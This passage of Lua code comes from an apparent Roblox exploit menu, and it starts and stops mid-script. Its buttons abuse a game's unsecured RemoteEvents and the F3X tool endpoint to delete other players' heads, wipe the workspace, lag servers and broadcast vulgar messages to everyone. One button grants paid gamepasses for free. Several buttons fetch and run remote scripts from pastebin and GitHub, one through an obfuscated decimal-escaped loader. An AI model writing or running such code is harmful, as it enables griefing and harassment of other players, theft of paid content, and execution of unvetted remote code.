+						F3X.Object(player.Character.Head).CFrame = game:GetService("Players").LocalPlayer.Character["Left Arm"].CFrame * CFrame.new(0, -0.5, 0)
+					end
+	
+				end)
+			end
+	
+		end)
+		Section3:NewButton("Color All Random", "", function()
+			local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()
+	
+			for _,player in pairs(game.Players:GetPlayers()) do
+				spawn(function()
+					F3X.Edit(player.Character:GetChildren(), {})
+					for _,limb in pairs(player.Character:GetChildren()) do
+						if limb:IsA("Accessory") and limb:FindFirstChildWhichIsA("BasePart") then
+							F3X.Object(limb:FindFirstChildWhichIsA("BasePart")):Destroy()
+						end
+					end
+	
+					for i,fee in pairs(player.Character:GetChildren()) do
+						if fee:IsA("BasePart") then
+							F3X.Object(fee).BrickColor = BrickColor.random()
+						end
+					end
+	
+				end)
+			end
+	
+		end)
+		Section2:NewButton("Ultra Ban Hammer", "", function()
+			player = game.Players.LocalPlayer
+	
+			Tool0 = Instance.new("Tool")
+			Part1 = Instance.new("Part")
+	
+			Tool0.Parent = player.Backpack
+			Tool0.Grip = CFrame.new(0, -1.00000083, 0, 1, 5.77420778e-08, -3.2037471e-07, -5.77420316e-08, 1, 1.37835528e-07, 3.2037471e-07, -1.37835514e-07, 1)
+			Tool0.GripForward = Vector3.new(3.2037470987233974e-07, -1.378355278802701e-07, -1)
+			Tool0.GripPos = Vector3.new(0, -1.0000008344650269, 0)
+			Tool0.GripRight = Vector3.new(1, -5.774203160058278e-08, 3.2037470987233974e-07)
+			Tool0.GripUp = Vector3.new(5.77420777858606e-08, 1, -1.3783551366941538e-07)
+			Part1.Name = "Handle"
+			Part1.Parent = Tool0
+			Part1.CFrame = CFrame.new(2.75, 1.87499976, -16.25, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+			Part1.Position = Vector3.new(2.75, 1.874999761581421, -16.25)
+			Part1.Size = Vector3.new(0,0,0)
+			Part1.BottomSurface = Enum.SurfaceType.Smooth
+			Part1.TopSurface = Enum.SurfaceType.Smooth
+	
+	
+			local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()
+	
+	
+	
+	
+			local part = F3X.new("Part", workspace)
+	
+			part.Locked = true
+			part.Size = Vector3.new(-48583883487437474, -48583883487437474, -48583883487437455454)
+			part.CFrame = game.Players.LocalPlayer.Character["Right Arm"].CFrame * CFrame.Angles(-7.85,9.45,0)*  CFrame.new(0.15,9,0.8)  wait()     
+			part:WeldTo(game.Players.LocalPlayer.Character["Right Arm"])
+			local duck = part:AddMesh()
+			duck.MeshId = "http://www.roblox.com/asset/?id=10604848"
+			duck.TextureId = "http://www.roblox.com/asset/?id=10605252"
+	
+	
+			duck.Scale = Vector3.new(3, 3, 3)
+	
+			game.Players.LocalPlayer.Backpack.Tool.Parent = game.Players.LocalPlayer.Character
+	
+		end)
+		Section2:NewButton("Owner Ban Hammer (BIG)", "", function()
+			player = game.Players.LocalPlayer
+	
+			Tool0 = Instance.new("Tool")
+			Part1 = Instance.new("Part")
+	
+			Tool0.Parent = player.Backpack
+			Tool0.Grip = CFrame.new(0, -1.00000083, 0, 1, 5.77420778e-08, -3.2037471e-07, -5.77420316e-08, 1, 1.37835528e-07, 3.2037471e-07, -1.37835514e-07, 1)
+			Tool0.GripForward = Vector3.new(3.2037470987233974e-07, -1.378355278802701e-07, -1)
+			Tool0.GripPos = Vector3.new(0, -1.0000008344650269, 0)
+			Tool0.GripRight = Vector3.new(1, -5.774203160058278e-08, 3.2037470987233974e-07)
+			Tool0.GripUp = Vector3.new(5.77420777858606e-08, 1, -1.3783551366941538e-07)
+			Part1.Name = "Handle"
+			Part1.Parent = Tool0
+			Part1.CFrame = CFrame.new(2.75, 1.87499976, -16.25, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+			Part1.Position = Vector3.new(2.75, 1.874999761581421, -16.25)
+			Part1.Size = Vector3.new(0,0,0)
+			Part1.BottomSurface = Enum.SurfaceType.Smooth
+			Part1.TopSurface = Enum.SurfaceType.Smooth
+	
+	
+			local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()
+	
+	
+	
+	
+			local part = F3X.new("Part", workspace)
+	
+			part.Locked = true
+			part.Size = Vector3.new(-48583883487437474, -48583883487437474, -48583883487437455454)
+			part.CFrame = game.Players.LocalPlayer.Character["Right Arm"].CFrame * CFrame.Angles(-7.85,9.45,0)*  CFrame.new(0.15,18,0.8)  wait()     
+			part:WeldTo(game.Players.LocalPlayer.Character["Right Arm"])
+			local duck = part:AddMesh()
+			duck.MeshId = "http://www.roblox.com/asset/?id=10604848"
+			duck.TextureId = "http://www.roblox.com/asset/?id=10605252"
+	
+	
+			duck.Scale = Vector3.new(5.5, 5.5, 5.5)
+	
+			game.Players.LocalPlayer.Backpack.Tool.Parent = game.Players.LocalPlayer.Character
+	
+		end)
+	end)
+end
+coroutine.wrap(MVNQPU_fake_script)()
+local function JWLTF_fake_script() -- ClearWorkspace.LocalScript 
+	local script = Instance.new('LocalScript', ClearWorkspace)
+
+	local btools = script.Parent.Parent.Parent.Parent.Settings.Page1["Btools Name"].Btools.Text
+	
+	local function get_f3x()
+		local lp = game:GetService('Players').LocalPlayer
+		if lp.Character:FindFirstChild(btools) then
+			return lp.Character:FindFirstChild(btools)
+		elseif lp.Backpack:FindFirstChild(btools) then
+			return lp.Backpack:FindFirstChild(btools)
+		end
+		return nil
+	end
+	
+	local function make_request(args)
+		local f3x = get_f3x()
+		if f3x == nil then
+			notify('Couldnt find F3X tool')
+			return
+		end
+	
+		f3x.SyncAPI.ServerEndpoint:InvokeServer(unpack(args))  
+	end
+	
+	local click_del = nil
+	local unanchor = nil
+	local loopkill = {}
+	
+	local function on_childadded(child)
+		task.wait()
+		if game:GetService('Players'):GetPlayerFromCharacter(child) ~= nil and table.find(loopkill, child.Name) then
+			local head = child:WaitForChild('Head')
+			make_request({
+				[1] = 'Remove';
+				[2] = {
+					head;
+				};
+			})
+		end
+	end
+	
+	game:GetService('Workspace').ChildAdded:Connect(on_childadded)
+	
+	script.Parent.MouseButton1Click:connect(function()
+		for i,c in pairs(game.Workspace:GetChildren()) do
+			local ohok = c
+			make_request({
+				[1] = 'Remove';
+				[2] = {
+					ohok;
+				};
+			})
+		end
+	end)
+end
+coroutine.wrap(JWLTF_fake_script)()
+local function LOEFV_fake_script() -- TextButton.LocalScript 
+	local script = Instance.new('LocalScript', TextButton)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet(("https://raw.githubusercontent.com/rusello25/scripts/main/4nn1")))()
+	end)
+end
+coroutine.wrap(LOEFV_fake_script)()
+local function HIMXH_fake_script() -- TextButton_2.LocalScript 
+	local script = Instance.new('LocalScript', TextButton_2)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet(("https://raw.githubusercontent.com/rusello25/scripts/main/redwood")))()
+	end)
+end
+coroutine.wrap(HIMXH_fake_script)()
+local function FACEGI_fake_script() -- TextButton_3.LocalScript 
+	local script = Instance.new('LocalScript', TextButton_3)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/Imagnir/r6_anims_for_r15/main/r6_anims.lua", true))()
+	end)
+end
+coroutine.wrap(FACEGI_fake_script)()
+local function APTOUHN_fake_script() -- TextButton_4.LocalScript 
+	local script = Instance.new('LocalScript', TextButton_4)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		shared.noclip = false
+		local stuff = {}
+	
+	
+		if not game:IsLoaded() then 
+			game.Loaded:Wait()
+		end
+	
+		local targetPlayer = game.Players.LocalPlayer
+		local teamFu = "Fugitives"
+		local teamPo = "Police"
+		local teamPr = "Prisoners"
+		local teamCh = "Choosing"
+	
+	
+	
+		lp = game.Players.LocalPlayer
+	
+		doorspamming = false
+		local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+	
+		local Main = OrionLib:MakeWindow({Name = "Bakers Valley", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})
+	
+		local Tab = Main:MakeTab({
+			Name = "Bakers Valley",
+			Icon = "rbxassetid://4483345998",
+			PremiumOnly = false
+		})
+	
+		local Section = Tab:AddSection({
+			Name = "All Haxxxxx"
+		})
+	
+		function doorSpam()
+			wait()
+			for _,doors in next, workspace.AllDoors:GetChildren() do --loop through doors
+				game:GetService("Workspace").resources.RemoteEvent:FireServer("updateDoorSystem", doors) --main remote
+			end
+		end
+		Tab:AddButton({
+			Name = "Bubble Shield",
+			Callback = function()
+				local lib = require(game:GetService("Workspace").upsilonLibrary)
+				local Bubble = Instance.new("Part")
+				Bubble.Parent = Workspace
+				Bubble.Size = Vector3.new(8, 8, 8)
+				Bubble.CastShadow = false
+				Bubble.CanCollide = false
+				Bubble.Anchored = true
+				Bubble.Shape = Enum.PartType.Ball
+				Bubble.BrickColor = BrickColor.new("21")
+				Bubble.Material = Enum.Material.ForceField
+				Bubble.Transparency = 0
+	
+	
+				function Shield(part)
+					local properties = {
+						["CanCollide"] = true,
+						["Parent"] = Workspace,
+						["Anchored"] = true,
+						["BrickColor"] = part.BrickColor,
+						["RotVelocity"] = part.RotVelocity,
+						["Name"] = part.Name,
+						["Position"] = part.Position,
+						["Material"] = part.Material,
+						["Shape"] = part.Shape,
+						["Size"] = part.Size,
+						["CastShadow"] = false,
+						["Transparency"] = 1
+	
+	
+					}
+	
+					lib.FireOtherClients("drawLaser",part.Position,part.Position,properties)
+				end
+	
+				while task.wait(0.01) do
+					Bubble.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+	
+					Shield(Bubble)
+				end
+			end
+		})
+		Tab:AddButton({
+			Name = "Profly",
+			Callback = function()
+				local lib = require(game:GetService("Workspace").upsilonLibrary)
+				local Bubble = Instance.new("Part")
+				Bubble.Parent = Workspace
+				Bubble.Size = Vector3.new(10, 1, 10)
+				Bubble.CastShadow = false
+				Bubble.CanCollide = true
+				Bubble.Anchored = true
+				Bubble.Color = Color3.fromRGB(255, 0, 0)
+				Bubble.Material = Enum.Material.Neon
+				Bubble.Transparency = 0
+	
+	
+				function fly(part)
+					local properties = {
+						["CanCollide"] = true,
+						["Parent"] = Workspace,
+						["Anchored"] = true,
+						["BrickColor"] = part.BrickColor,
+						["RotVelocity"] = part.RotVelocity,
+						["Name"] = part.Name,
+						["Position"] = part.Position,
+						["Material"] = part.Material,
+						["Size"] = part.Size,
+						["CastShadow"] = false,
+						["Transparency"] = 1
+	
+	
+					}
+	
+					lib.FireOtherClients("drawLaser",part.Position,part.Position,properties)
+				end
+	
+				while task.wait(0.01) do
+					Bubble.Position = game.Players.LocalPlayer.Character.Head.Position + Vector3.new(0,-5,0)
+	
+					fly(Bubble)
+				end
+			end
+		})
+		Tab:AddButton({
+			Name = "Darkone Portal Leaked",
+			Callback = function()
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/lol8267vr/steal-this-bozos-script-/main/message-1.txt"))()
+			end
+		})
+		Tab:AddButton({
+			Name = "Fly",
+			Callback = function()
+				loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\103\105\115\116\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\109\101\111\122\111\110\101\89\84\47\98\102\48\51\55\100\102\102\57\102\48\97\55\48\48\49\55\51\48\52\100\100\100\54\55\102\100\99\100\51\55\48\47\114\97\119\47\101\49\52\101\55\52\102\52\50\53\98\48\54\48\100\102\53\50\51\51\52\51\99\102\51\48\98\55\56\55\48\55\52\101\98\51\99\53\100\50\47\97\114\99\101\117\115\37\50\53\50\48\120\37\50\53\50\48\102\108\121\37\50\53\50\48\50\37\50\53\50\48\111\98\102\108\117\99\97\116\111\114\39\41\44\116\114\117\101\41\41\40\41\10\10")()
+			end
+		})
+		Tab:AddButton({
+			Name = "Nuke",
+			Callback = function()
+				local Yourmessage = "A Nuclear Missile Has Been Launched!"
+	
+				game:GetService("Workspace").resources.RemoteEvent:FireServer("FireAllClients", "smallNotice", Yourmessage) workspace.resources.RemoteEvent:FireServer("FireAllClients", "updateAlarmLight", {
+					Active = {Value = true},
+					glass = game.Players.LocalPlayer.Character.Head,
+				})
+				local lib = require(game:GetService("Workspace").upsilonLibrary)
+				firesignal(game.Workspace.resources.RemoteEvent.OnClientEvent,"displayChoice",'returnToMenu',"Attention Players A Nuke Has Been Launched!")
+				lib.FireOtherClients("displayChoice",'returnToMenu',"Attention Players A Nuke Has Been Launched!")
+				local args = {
+					[1] = "[Nuke Launch:10 sec]",
+					[2] = "All"
+				}
+	
+				game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(unpack(args))
+				wait (1)
+				local args = {
+					[1] = "[Nuke Launch: 9 sec]",
+					[2] = "All"
+				}
+	
+				game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(unpack(args))
+				local args = {
+					[1] = "[Nuke Launch:8 sec]",
+					[2] = "All"
+				}
+	
+				game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(unpack(args))
+				wait(1)
+				local args = {
+					[1] = "[Nuke Launch:7 sec]",
+					[2] = "All"
+				}
+	
+				game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(unpack(args))
+				wait(1)
+				local args = {
+					[1] = "[Nuke Launch:6 sec]",
+					[2] = "All"
+				}
+	
+				game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(unpack(args))
+				wait (1)
+				local args = {
+					[1] = "[Nuke Launch:5 sec]",
+					[2] = "All"
+				}
+	
+				game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(unpack(args))
+				wait (1)
+				local args = {
+					[1] = "[Nuke Launch:4 sec]",
+					[2] = "All"
+				}
+	
+				game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(unpack(args))
+				wait(1)
+				local args = {
+					[1] = "[Nuke Launch:3 sec]",
+					[2] = "All"
+				}
+	
+				game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(unpack(args))
+				wait(1)
+				local args = {
+					[1] = "[Nuke Launch:2 sec ]",
+					[2] = "All"
+				}
+	
+				game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(unpack(args))
+				wait(1)
+				local args = {
+					[1] = "[Nuke Launch:1 sec ]",
+					[2] = "All"
+				}
+	
+				game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(unpack(args))
+				local args = {
+					[1] = "[Nuke Launch: Success ! ]",
+					[2] = "All"
+				}
+	
+				game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(unpack(args))
+				wait (10)
+				local lib = require(game:GetService("Workspace").upsilonLibrary)
+				for i,v in pairs(game.Players:GetPlayers()) do lib.FireOtherClients("drawLaser",Vector3.new(), Vector3.new(),{["Name"] = "Head",["Parent"] = v.Character})
+				end
+				local lib = require(game:GetService("Workspace").upsilonLibrary)
+				local Bubble = Instance.new("Part")
+				Bubble.Size = Vector3.new(9000000, 9000, 9000)
+				Bubble.CastShadow = false
+				Bubble.CanCollide = true
+				Bubble.Anchored = true
+				Bubble.Parent = Workspace 
+				Bubble.Velocity = Vector3.new(0, 90000000, 0)
+				Bubble.Shape = Enum.PartType.Ball
+				Bubble.BrickColor = BrickColor.new("1009")
+				Bubble.Material = Enum.Material.Neon
+				Bubble.Transparency = 0
+	
+	
+				function Nuke(part)
+					local properties = {
+						["CanCollide"] = true,
+						["Parent"] = Workspace,
+						["Anchored"] = true,
+						["BrickColor"] = part.BrickColor,
+						["RotVelocity"] = part.RotVelocity,
+						["Name"] = part.Name,
+						["Position"] = part.Position,
+						["Material"] = part.Material,
+						["Shape"] = part.Shape,
+						["Size"] = part.Size,
+						["CastShadow"] = false,
+						["Transparency"] = 1
+	
+	
+					}
+	
+					lib.FireOtherClients("drawLaser",part.Position,part.Position,properties)
+				end
+				while task.wait(0.01) do
+					Bubble.CFrame = 
+						CFrame.new(-6.10489082, 4, -15.8136148)
+					Nuke(Bubble)
+				end
+			end
+		})
+		Tab:AddButton({
+			Name = "Void All",
+			Callback = function()
+				local lib = require(game:GetService("Workspace").upsilonLibrary)
+				local Bubble = Instance.new("Part")
+				Bubble.Size = Vector3.new(9000000, 9000, 9000)
+				Bubble.CastShadow = false
+				Bubble.CanCollide = false
+				Bubble.Anchored = true
+				Bubble.Parent = Workspace 
+				Bubble.Velocity = Vector3.new(0, 99999999999, 0)
+				Bubble.Shape = Enum.PartType.Ball
+				Bubble.BrickColor = BrickColor.new("1009")
+				Bubble.Material = Enum.Material.Neon
+				Bubble.Transparency = 0
+	
+	
+				function Nuke(part)
+					local properties = {
+						["CanCollide"] = true,
+						["Parent"] = Workspace,
+						["Anchored"] = true,
+						["BrickColor"] = part.BrickColor,
+						["RotVelocity"] = part.RotVelocity,
+						["Name"] = part.Name,
+						["Position"] = part.Position,
+						["Material"] = part.Material,
+						["Shape"] = part.Shape,
+						["Size"] = part.Size,
+						["CastShadow"] = false,
+						["Transparency"] = 1
+	
+	
+					}
+	
+					lib.FireOtherClients("drawLaser",part.Position,part.Position,properties)
+				end
+	
+				Bubble.CFrame = 
+					CFrame.new(-6.10489082, 4, -15.8136148)
+				Nuke(Bubble)
+			end
+		})
+		Tab:AddButton({
+			Name = "GodWalk",
+			Callback = function()
+				local lib = require(game:GetService("Workspace").upsilonLibrary)
+				local Bubble = Instance.new("Part")
+				Bubble.Parent = Workspace
+				Bubble.Size = Vector3.new(1, 10, 10)
+				Bubble.CastShadow = true
+				Bubble.CanCollide = true
+				Bubble.Anchored = true
+				Bubble.Shape = Enum.PartType.Cylinder
+				Bubble.Color = Color3.fromRGB(255, 0, 0)
+				Bubble.Material = Enum.Material.Neon
+				Bubble.Transparency = 0
+				Bubble.Orientation = Vector3.new(0, 0, 90)
+	
+				function Shield(part)
+					local properties = {
+						["CanCollide"] = true,
+						["Parent"] = Workspace,
+						["Anchored"] = true,
+						["BrickColor"] = part.BrickColor,
+						["RotVelocity"] = part.RotVelocity,
+						["Orientation"] = Vector3.new(0, 0, 90),
+						["Name"] = part.Name,
+						["Position"] = part.Position,
+						["Material"] = part.Material,
+						["Shape"] = part.Shape,
+						["Size"] = part.Size,
+						["CastShadow"] = true,
+						["Transparency"] = 1
+	
+					}
+	
+					lib.FireOtherClients("drawLaser",part.Position,part.Position,properties)
+				end
+	
+				while task.wait(0.01) do
+					Bubble.Position = game.Players.LocalPlayer.Character.Head.Position + Vector3.new(0,-5,0)
+	
+					Shield(Bubble)
+				end
+			end
+		})
+		Tab:AddButton({
+			Name = "SEX",
+			Callback = function()
+				for i,v in pairs(game.Players:GetChildren())do
+					local lib = require(game:GetService("Workspace").upsilonLibrary)
+	
+					firesignal(game.Workspace.resources.RemoteEvent.OnClientEvent,"displayChoice",'returnToMenu',"sex")
+					lib.FireOtherClients("displayChoice",'returnToMenu',"sex")
+				end
+			end    
+		})
+	
+		Tab:AddButton({
+			Name = "Lag Others",
+			Callback = function() loadstring(game:HttpGet(('https://pastebin.com/raw/bLsmSvd0'),true))()
+			end
+		})
+	
+		Tab:AddButton({
+			Name = "Bridge Tool",
+			Callback = function() 
+				local tool = Instance.new("Tool", game.Players.LocalPlayer.Backpack)
+				tool.RequiresHandle = false
+				tool.Name = "Bridge"
+				tool.CanBeDropped = false
+	
+				local pos1 = nil
+				local pos2 = nil
+				local bridgesize = 10
+				local mouse = game.Players.LocalPlayer:GetMouse()
+				local isEquipped = false
+				local isSettingPos = false
+				local bridgeEnabled = false
+				local dist = 0
+	
+				function asdf(origin, target, properties)
+					game.Workspace.resources.RemoteEvent:FireServer("FireAllClients","drawLaser", origin, target, properties)
+				end
+	
+				mouse.KeyDown:Connect(function(k)
+					if not isEquipped then return end
+					key = k:lower()
+					if key == "e" then
+						if bridgesize <= 5 then return end
+						bridgesize = bridgesize - 1
+						game:GetService("StarterGui"):SetCore("SendNotification", {
+							Title = "Information";
+							Text = "New size: " .. bridgesize;
+						})
+						print(bridgesize)
+					end
+					if key == "r" then
+						if bridgesize >= 25 then return end
+						bridgesize = bridgesize + 1
+						game:GetService("StarterGui"):SetCore("SendNotification", {
+							Title = "Information";
+							Text = "New size: " .. bridgesize;
+						})
+						print(bridgesize)
+					end
+					if key == "t" then
+						bridgeEnabled = false
+						isSettingPos = false
+						pos1 = nil
+						pos2 = nil
+						bridgesize = 10
+						game:GetService("StarterGui"):SetCore("SendNotification", {
+							Title = "Information";
+							Text = "Values reset to default.";
+						})
+					end
+				end)
+	
+	
+				tool.Equipped:Connect(function()
+					isEquipped = true
+					game:GetService("StarterGui"):SetCore("SendNotification", {
+						Title = "Information";
+						Text = "Click to set positions, Press R to increase width, E to decrease width and Press T to reset.";
+					})
+				end)
+	
+				tool.Unequipped:Connect(function()
+					isEquipped = false
+				end)
+	
+	
+	
+				tool.Activated:Connect(function()
+					if not isSettingPos then
+						pos1 = mouse.hit
+						game:GetService("StarterGui"):SetCore("SendNotification", {
+							Title = "Information";
+							Text = "Position 1 saved, click again for position 2.";
+						})
+						isSettingPos = true
+					else
+						pos2 = mouse.hit
+						game:GetService("StarterGui"):SetCore("SendNotification", {
+							Title = "Information";
+							Text = "Position 2 saved, creating bridge...";
+						})
+						isSettingPos = false
+						bridgeEnabled = true
+						dist = (pos1.p-pos2.p).magnitude
+					end
+				end)
+	
+				while true do
+					wait(.1)
+					if bridgeEnabled then
+						asdf(pos1.p, pos2.p, {
+							["CanCollide"] = true,
+							["Size"] = Vector3.new(bridgesize, 1, dist),
+							["CFrame"] = CFrame.new(pos1.p, pos2.p) * CFrame.new(0,0, -dist/2) * CFrame.Angles(0,0,0),
+						})
+					end
+				end
+			end
+		})
+	
+		Tab:AddButton({
+			Name = "C4 tool",
+			Callback = function()
+				function createC4art(part, size, cframe, material, color, transparency)
+					wait (0.4)
+					local lib = require(game:GetService("Workspace").upsilonLibrary)
+					local g = Instance.new("Part")
+					g.Parent = Workspace
+					g.TopSurface = "Smooth"
+					g.Material = Enum.Material.Ice
+					g.Reflectance = 0
+					g.CanCollide = true
+					g.Anchored = true
+					g.Size = Vector3.new(2, 2, 5)
+					g.CFrame = cframe
+					g.BrickColor = BrickColor.new("28")
+					g.Transparency = transparency
+					g.Parent = Workspace
+					g.Shape = Enum.PartType.Block
+					g.Orientation = Vector3.new(0, 0, 90)
+	
+	
+					local properties = {
+						["TopSurface"] = "Smooth",
+						["Material"] = Enum.Material.Ice,
+						["Reflectance"] = 0,
+						["CanCollide"] = true,
+						["Anchored"] = true,
+						["Size"] = Vector3.new(2, 2, 5),
+						["CFrame"] = cframe,
+						["Shape"] = Enum.PartType.Block,
+						["Orientation"] = Vector3.new(0, 0, 90),
+						["BrickColor"] = BrickColor.new("28"),
+						["Transparency"] = transparency,
+						["Parent"] = Workspace
+					}
+	
+	
+					lib.FireOtherClients("drawLaser", part.Position, part.Position, properties)
+					wait(1)
+					g:Destroy()
+				end
+	
+				function createCPart(part, size, cframe, material, color, transparency)
+					wait (0.4)
+					local lib = require(game:GetService("Workspace").upsilonLibrary)
+					local g = Instance.new("Part")
+					g.Parent = Workspace
+					g.TopSurface = "Smooth"
+					g.Material = Enum.Material.Neon
+					g.Reflectance = 0
+					g.CanCollide = false
+					g.Anchored = true
+					g.Size = Vector3.new(15, 15, 15)
+					g.Velocity = Vector3.new(0, 8000, 0)
+					g.CFrame = cframe
+					g.BrickColor = BrickColor.new("133")
+					g.Transparency = transparency
+					g.Parent = Workspace
+					g.Shape = Enum.PartType.Ball
+					g.Orientation = Vector3.new(0, 0, 90)
+	
+	
+					local properties = {
+						["TopSurface"] = "Smooth",
+						["Material"] = Enum.Material.Neon,
+						["Reflectance"] = 0,
+						["CanCollide"] = true,
+						["Anchored"] = true,
+						["Size"] = Vector3.new(15, 15, 15),
+						["Velocity"] = Vector3.new(0, 8000, 0),
+						["CFrame"] = cframe,
+						["Shape"] = Enum.PartType.Ball,
+						["Orientation"] = Vector3.new(0, 0, 90),
+						["BrickColor"] = BrickColor.new("133"),
+						["Transparency"] = transparency,
+						["Parent"] = Workspace
+					}
+	
+	
+					lib.FireOtherClients("drawLaser", part.Position, part.Position, properties)
+					wait(0.7)
+					g:Destroy()
+				end
+	
+				local tool = Instance.new("Tool", game.Players.LocalPlayer.Backpack)
+				tool.Name = "C4 Tool"
+				tool.RequiresHandle = false
+	
+				tool.Activated:Connect(function()
+					local mouse = game:GetService("Players").LocalPlayer:GetMouse()
+					local mouseHit = mouse.Hit.p + Vector3.new(0, 0, 0)
+					local cframe = CFrame.new(mouseHit)
+					if mouse.Target and mouse.Target:IsA("BasePart") then
+						createC4art(mouse.Target, mouse.Target.Size + Vector3.new(0.005, 0.005, 0.005), cframe, mouse.Target.Material, mouse.Target.Color, mouse.Target.Transparency)
+					end
+	
+					local mouse = game:GetService("Players").LocalPlayer:GetMouse()
+					local mouseHit = mouse.Hit.p + Vector3.new(0, 0, 0)
+					local cframe = CFrame.new(mouseHit)
+					if mouse.Target and mouse.Target:IsA("BasePart") then
+						createCPart(mouse.Target, mouse.Target.Size + Vector3.new(0.005, 0.005, 0.005), cframe, mouse.Target.Material, mouse.Target.Color, mouse.Target.Transparency)
+					end
+				end)
+			end    
+		})
+		Tab:AddButton({
+			Name = "Paint tool",
+			Callback = function()
+				local lib = require(game:GetService("Workspace").upsilonLibrary) 
+				function createpaint(part,Size,CFrame,Material,e,Transparency)
+					local paint = Instance.new("Part")
+					paint.Parent = Workspace
+					paint.TopSurface = "Smooth"
+					paint.Material = Material
+					paint.Reflectance = 0
+					paint.CanCollide = true
+					paint.Anchored = true
+					paint.Size = Size
+					paint.CFrame = CFrame
+					paint.Color = Color3.fromRGB(255, 0, 0)
+					paint.Transparency = transparency
+					paint.Parent = Workspace
+	
+					local properties = {
+						["TopSurface"] = DiscordInvite,
+						["Material"] = Material,
+						["Reflectance"] = 0,
+						["CanCollide"] = true,
+						["Anchored"] = true,
+						["Size"] = Size,
+						["CFrame"] = CFrame,
+						["Color"] = Color3.fromRGB(255, 0, 0),
+						["Transparency"] = Transparency,
+						["Parent"] = Workspace
+					}
+					while wait (0) do
+						while wait (0) do	lib.FireOtherClients("drawLaser",part.Position,part.Position,properties)
+						end
+					end
+				end
+				local tool = Instance.new("Tool", game.Players.LocalPlayer.Backpack)
+				tool.Name = "Paint tool"
+				tool.Parent = game.Players.LocalPlayer.Backpack
+				local Player = Game.Players.LocalPlayer
+				local Mouse = Player:GetMouse()
+				tool.RequiresHandle = false
+				tool.Activated:connect(function()
+					if Mouse.Target:IsA("BasePart") then
+						local paint = Instance.new("Part")
+						paint.Parent = Workspace
+						createpaint(paint,Mouse.Target.Size+Vector3.new(0.005,0.005,0.005),Mouse.Target.CFrame,Mouse.Target.Material,Mouse.Target.BrickColor,Mouse.Target.Transparency)
+						paint:Destroy()
+					end
+				end)
+			end    
+		})
+		Tab:AddButton({
+			Name = "SEX1",
+			Callback = function()
+				local Yourmessage = "SEX"
+	
+				game:GetService("Workspace").resources.RemoteEvent:FireServer("FireAllClients", "smallNotice", Yourmessage)
+			end
+		})
+		Tab:AddButton({
+			Name = "Say Fuck",
+			Callback = function()
+				local Yourmessage = "fuck you"
+	
+				game:GetService("Workspace").resources.RemoteEvent:FireServer("FireAllClients", "smallNotice", Yourmessage)
+			end
+		})
+		Tab:AddButton({
+			Name = "Say Fuck you 2",
+			Callback = function()
+				local Title = "Fuck you"
+				local Yourmessage = "bitch asses"
+	
+	
+				game:GetService("Workspace").resources.RemoteEvent:FireServer("FireAllClients", "showNotice", Title, Yourmessage)
+			end
+		})
+		Tab:AddButton({
+			Name = "SEX2",
+			Callback = function()
+				local Title = "SEX"
+				local Yourmessage = "SEX"
+	
+	
+				game:GetService("Workspace").resources.RemoteEvent:FireServer("FireAllClients", "showNotice", Title, Yourmessage)
+			end
+		})
+	
+		Tab:AddButton({
+			Name = "All Gamepasses",
+			Callback = function()
+				sv=function(a,b)
+					game:GetService("Workspace").resources.RemoteFunction:InvokeServer("setDataValue",a,b)
+				end
+				gv=function(a)
+					return game:GetService("Workspace").resources.RemoteFunction:InvokeServer("getDataValue",a)
+				end
+				sv("hasMaglev",true)
+				sv("hasMasterChef",true)
+				sv("hasMaterials",true)
+			end
+		})
+	
+		Tab:AddButton({
+			Name = "Destroy Server",
+			Callback = function()  
+				for i,v in pairs(workspace:GetDescendants()) do
+					if v:IsA("BasePart") then
+						game:GetService("Workspace").resources.RemoteEvent:FireServer("FireAllClients","updateAlarmLight",{["Active"] = {["Value"] = true},["glass"] = v,["main"] = v})
+					end
+				end
+			end
+		})
+		Tab:AddButton({
+			Name = "Whiteify Map",
+			Callback = function()  
+				for i,v in pairs(workspace:GetDescendants()) do
+					if v:IsA("BasePart") then
+						game:GetService("Workspace").resources.RemoteEvent:FireServer("FireAllClients","updateAlarmLight",{["Active"] = {["Value"] = false},["glass"] = v,["main"] = v})
+					end
+				end
+			end
+		})
+		Tab:AddTextbox({
+			Name = "Textbox",
+			Default = "default box input",
+			TextDisappear = true,
+			Callback = function(Value)
